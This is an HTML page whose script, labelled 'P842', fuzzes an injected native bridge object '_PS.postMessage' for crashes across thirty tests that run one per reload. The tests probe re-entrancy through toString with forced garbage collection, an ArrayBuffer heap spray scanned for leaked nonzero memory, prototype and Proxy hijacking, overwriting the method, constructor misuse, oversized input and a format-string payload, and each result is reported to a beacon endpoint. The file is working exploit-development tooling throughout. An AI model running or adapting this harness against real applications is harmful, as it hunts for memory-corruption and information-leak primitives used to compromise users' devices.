<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P842</title>
<style>
body{background:#0d1117;color:#c9d1d9;font:12px monospace;margin:8px;}
pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:90vh;overflow-y:auto;}
.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
</style>
</head><body>
<pre id="o">P842: Re-entry Crash Isolator — Which _PS call kills?</pre>
<script>
'use strict';
var O=document.getElementById('o');
function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
function bn(t,d){
  try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P842-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
  x.send();}catch(e){}
}

/* Which test to run is controlled by URL hash: #0, #1, #2, ... */
/* Each reload tries the next test. This isolates crashes. */
var testNum=parseInt(location.hash.slice(1))||0;
bn('BOOT','test='+testNum);
log('Test #'+testNum,'hot');

/* ========== TEST BATTERY ========== */
/* Each test is isolated. If a test crashes, the next reload skips to the next one. */

function advance(){
  location.hash='#'+(testNum+1);
  location.reload();
}

function runTest(n){
  switch(n){

  /* --- Group 1: Direct _PS.postMessage with non-string types --- */
  case 0:
    log('T0: _PS.postMessage(undefined)','info');
    bn('T0-PRE','calling');
    try{var r=_PS.postMessage(undefined);bn('T0-OK','ret='+String(r));log('OK: ret='+r,'ok');}
    catch(e){bn('T0-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 1:
    log('T1: _PS.postMessage(null)','info');
    bn('T1-PRE','calling');
    try{var r=_PS.postMessage(null);bn('T1-OK','ret='+String(r));log('OK: ret='+r,'ok');}
    catch(e){bn('T1-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 2:
    log('T2: _PS.postMessage(42)','info');
    bn('T2-PRE','calling');
    try{var r=_PS.postMessage(42);bn('T2-OK','ret='+String(r));log('OK: ret='+r,'ok');}
    catch(e){bn('T2-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 3:
    log('T3: _PS.postMessage(true)','info');
    bn('T3-PRE','calling');
    try{var r=_PS.postMessage(true);bn('T3-OK','ret='+String(r));log('OK: ret='+r,'ok');}
    catch(e){bn('T3-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 4:
    log('T4: _PS.postMessage({})','info');
    bn('T4-PRE','calling');
    try{var r=_PS.postMessage({});bn('T4-OK','ret='+String(r));log('OK: ret='+r,'ok');}
    catch(e){bn('T4-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 5:
    log('T5: _PS.postMessage(new ArrayBuffer(8))','info');
    bn('T5-PRE','calling');
    try{var r=_PS.postMessage(new ArrayBuffer(8));bn('T5-OK','ret='+String(r));log('OK: ret='+r,'ok');}
    catch(e){bn('T5-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 6:
    log('T6: _PS.postMessage(Symbol("x"))','info');
    bn('T6-PRE','calling');
    try{var r=_PS.postMessage(Symbol('x'));bn('T6-OK','ret='+String(r));log('OK: ret='+r,'ok');}
    catch(e){bn('T6-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  /* --- Group 2: toString re-entrancy (isolated sub-operations) --- */
  case 7:
    log('T7: postMessage({toString:simple})','info');
    bn('T7-PRE','calling');
    try{
      var r=_PS.postMessage({toString:function(){return 'hello';}});
      bn('T7-OK','ret='+String(r));log('OK: toString survived','ok');
    }catch(e){bn('T7-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 8:
    log('T8: postMessage({toString: does GC})','info');
    bn('T8-PRE','calling');
    try{
      var r=_PS.postMessage({toString:function(){
        var junk=[];
        for(var i=0;i<5000;i++)junk.push({x:new ArrayBuffer(64)});
        junk=null;
        return 'gc-done';
      }});
      bn('T8-OK','ret='+String(r));log('OK: GC in toString survived','ok');
    }catch(e){bn('T8-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 9:
    log('T9: postMessage({toString: calls takeHeapSnapshot})','info');
    bn('T9-PRE','calling');
    try{
      var r=_PS.postMessage({toString:function(){
        console.takeHeapSnapshot();
        return 'snap-done';
      }});
      bn('T9-OK','ret='+String(r));log('OK: takeHeapSnapshot in toString','ok');
    }catch(e){bn('T9-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 10:
    log('T10: postMessage({toString: recursive postMessage})','info');
    bn('T10-PRE','calling');
    try{
      var depth=0;
      var r=_PS.postMessage({toString:function(){
        depth++;
        if(depth<3)_PS.postMessage('recurse-'+depth);
        return 'depth='+depth;
      }});
      bn('T10-OK','ret='+String(r)+'|depth='+depth);log('OK: recursive depth='+depth,'ok');
    }catch(e){bn('T10-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 11:
    log('T11: postMessage({toString: deletes _PS from window})','info');
    bn('T11-PRE','calling');
    try{
      var saved=_PS;
      var r=saved.postMessage({toString:function(){
        try{delete window._PS;}catch(e){}
        try{window._PS=undefined;}catch(e){}
        return 'deleted';
      }});
      window._PS=saved;
      bn('T11-OK','ret='+String(r));log('OK: delete+restore survived','ok');
    }catch(e){bn('T11-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 12:
    log('T12: postMessage({toString: GC + AB spray})','info');
    bn('T12-PRE','calling');
    try{
      var sprayABs=[];
      var r=_PS.postMessage({toString:function(){
        var junk=[];
        for(var i=0;i<5000;i++)junk.push({x:new ArrayBuffer(64)});
        junk=null;
        for(var i=0;i<200;i++)sprayABs.push(new ArrayBuffer(192));
        return 'sprayed';
      }});
      bn('T12-OK','ret='+String(r)+'|spray='+sprayABs.length);
      /* Scan spray for nonzero */
      var hits=0;
      for(var i=0;i<sprayABs.length;i++){
        var bv=new BigUint64Array(sprayABs[i]);
        for(var j=0;j<bv.length;j++)if(bv[j]!==BigInt(0))hits++;
      }
      bn('T12-SPRAY','hits='+hits);log('OK: spray='+sprayABs.length+',hits='+hits,'ok');
    }catch(e){bn('T12-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  /* --- Group 3: Proxy/prototype attacks --- */
  case 13:
    log('T13: Proxy(_PS) basic','info');
    bn('T13-PRE','calling');
    try{
      var pLog=[];
      var p=new Proxy(_PS,{
        get:function(t,k){pLog.push('g:'+String(k));return Reflect.get(t,k);}
      });
      p.postMessage('proxy-test');
      bn('T13-OK','log='+pLog.join(';'));log('OK: proxy traps='+pLog.join(';'),'ok');
    }catch(e){bn('T13-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 14:
    log('T14: Proxy(_PS) with apply trap','info');
    bn('T14-PRE','calling');
    try{
      var pmFunc=_PS.postMessage;
      var pf=new Proxy(pmFunc,{
        apply:function(t,th,args){bn('T14-APPLY','args='+args.length);return Reflect.apply(t,_PS,args);}
      });
      pf('apply-test');
      bn('T14-OK','applied');log('OK: apply trap worked','ok');
    }catch(e){bn('T14-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 15:
    log('T15: Object.setPrototypeOf(_PS, custom)','info');
    bn('T15-PRE','calling');
    try{
      var orig=Object.getPrototypeOf(_PS);
      Object.setPrototypeOf(_PS,{heapDump:function(){return 42;}});
      var r=_PS.heapDump();
      bn('T15-OK','heapDump='+r+'|proto-changed');
      log('OK: prototype changed, heapDump()='+r,'ok');
      /* Restore */
      Object.setPrototypeOf(_PS,orig);
    }catch(e){bn('T15-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 16:
    log('T16: Object.defineProperty(_PS, "postMessage", writable)','info');
    bn('T16-PRE','calling');
    try{
      Object.defineProperty(_PS,'postMessage',{value:function(){return 'hijacked';},writable:true,configurable:true});
      var r=_PS.postMessage('test');
      bn('T16-OK','ret='+String(r));log('OK: postMessage hijacked, ret='+r,'hot');
    }catch(e){bn('T16-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 17:
    log('T17: postMessage.call(null, "test")','info');
    bn('T17-PRE','calling');
    try{
      var r=_PS.postMessage.call(null,'test');
      bn('T17-OK','ret='+String(r));log('OK: call(null)='+r,'ok');
    }catch(e){bn('T17-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 18:
    log('T18: postMessage.call(window, "test")','info');
    bn('T18-PRE','calling');
    try{
      var r=_PS.postMessage.call(window,'test');
      bn('T18-OK','ret='+String(r));log('OK: call(window)='+r,'ok');
    }catch(e){bn('T18-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 19:
    log('T19: postMessage.call({}, "test") — wrong this','info');
    bn('T19-PRE','calling');
    try{
      var r=_PS.postMessage.call({},'test');
      bn('T19-OK','ret='+String(r));log('OK: call({})='+r,'ok');
    }catch(e){bn('T19-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  /* --- Group 4: toString that modifies _PS during call --- */
  case 20:
    log('T20: toString that sets _PS.postMessage proto chain','info');
    bn('T20-PRE','calling');
    try{
      var r=_PS.postMessage({toString:function(){
        try{Object.setPrototypeOf(_PS,{debug:function(){return 'dbg';}});}catch(e){}
        return 'proto-mod';
      }});
      bn('T20-OK','ret='+String(r));log('OK: proto mod in toString','ok');
    }catch(e){bn('T20-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 21:
    log('T21: toString that calls postMessage recursively 10x','info');
    bn('T21-PRE','calling');
    try{
      var count=0;
      var r=_PS.postMessage({toString:function(){
        count++;
        if(count<10){
          try{_PS.postMessage('inner-'+count);}catch(e){}
        }
        return 'count='+count;
      }});
      bn('T21-OK','count='+count);log('OK: recursive count='+count,'ok');
    }catch(e){bn('T21-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 22:
    log('T22: toString that throws','info');
    bn('T22-PRE','calling');
    try{
      var r=_PS.postMessage({toString:function(){throw new Error('deliberate');}});
      bn('T22-OK','ret='+String(r));log('OK: throw caught, ret='+r,'ok');
    }catch(e){bn('T22-ERR',e.message);log('Caught: '+e.message,'info');}
    advance();
    break;

  case 23:
    log('T23: valueOf (not toString)','info');
    bn('T23-PRE','calling');
    try{
      var r=_PS.postMessage({valueOf:function(){return 0xDEADBEEF;},toString:undefined});
      bn('T23-OK','ret='+String(r));log('OK: valueOf ret='+r,'ok');
    }catch(e){bn('T23-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 24:
    log('T24: Symbol.toPrimitive','info');
    bn('T24-PRE','calling');
    try{
      var obj={};
      obj[Symbol.toPrimitive]=function(hint){bn('T24-HINT','hint='+hint);return 'prim-'+hint;};
      var r=_PS.postMessage(obj);
      bn('T24-OK','ret='+String(r));log('OK: toPrimitive ret='+r,'ok');
    }catch(e){bn('T24-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  /* --- Group 5: postMessage.bind / construct --- */
  case 25:
    log('T25: new _PS.postMessage("test") — construct','info');
    bn('T25-PRE','calling');
    try{
      var r=new _PS.postMessage('test');
      bn('T25-OK','ret='+String(r)+'|type='+typeof r);log('OK: constructed','hot');
    }catch(e){bn('T25-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 26:
    log('T26: Reflect.construct(_PS.postMessage, ["test"])','info');
    bn('T26-PRE','calling');
    try{
      var r=Reflect.construct(_PS.postMessage,['test']);
      bn('T26-OK','ret='+String(r));log('OK: Reflect.construct','hot');
    }catch(e){bn('T26-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 27:
    log('T27: postMessage with very long string (1MB)','info');
    bn('T27-PRE','calling');
    try{
      var big='A'.repeat(1024*1024);
      var r=_PS.postMessage(big);
      bn('T27-OK','ret='+String(r));log('OK: 1MB string accepted','ok');
    }catch(e){bn('T27-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 28:
    log('T28: postMessage with format string %n%s%x','info');
    bn('T28-PRE','calling');
    try{
      var r=_PS.postMessage('%n%n%n%n%s%s%s%x%x%x%p%p%p');
      bn('T28-OK','ret='+String(r));log('OK: format string accepted','ok');
    }catch(e){bn('T28-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  case 29:
    log('T29: postMessage(NaN) and postMessage(Infinity)','info');
    bn('T29-PRE','calling');
    try{_PS.postMessage(NaN);_PS.postMessage(Infinity);_PS.postMessage(-Infinity);
      bn('T29-OK','special-nums');log('OK: special numbers accepted','ok');
    }catch(e){bn('T29-ERR',e.message);log('ERR: '+e.message,'fail');}
    advance();
    break;

  /* --- DONE --- */
  default:
    log('\n====== ALL '+n+' TESTS COMPLETE ======','hot');
    bn('ALL-DONE','tests='+n);
    break;
  }
}

runTest(testNum);
</script></body></html>
